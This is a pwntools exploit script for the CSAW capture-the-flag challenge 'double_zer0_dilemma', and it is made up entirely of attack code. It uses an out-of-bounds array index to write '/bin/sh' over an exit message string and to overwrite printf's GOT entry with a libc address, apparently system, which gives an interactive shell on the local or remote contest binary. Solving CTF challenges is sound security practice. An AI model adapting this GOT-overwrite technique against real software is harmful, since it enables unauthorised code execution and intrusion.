#!/usr/bin/python
from pwn import *

file = ELF("./double_zer0_dilemma")
libc = ELF("./libc-2.31.so")
context.terminal = ["kitty"]
script="""
b play
c
"""

if args.REMOTE:
    p = remote("double-zer0.csaw.io", 9999)
elif args.GDB:
    p = gdb.debug("./patch", gdbscript=script)
else:
    p = process("./patch")

def adjust(plain, new):
    victim = (-plain % (1 << 64) + new * 2) % (1 << 64)
    if victim.bit_length() == 64:
        victim = -(-victim % (1 << 64))
    log.info(f"victim: {victim}")
    return str(victim).encode()

plain = u64(b"Your tot")
new = u64(b"/bin/sh\x00")

p.sendline(str(file.sym.exit_msg - file.sym.bets >> 3).encode())
p.sendline(adjust(plain, new))
p.sendline(str(file.got.printf - file.sym.bets >> 3).encode())
p.sendline(adjust(0x401040, 0x7ffff7e20290 + 0x1000 * 0x02))

p.interactive()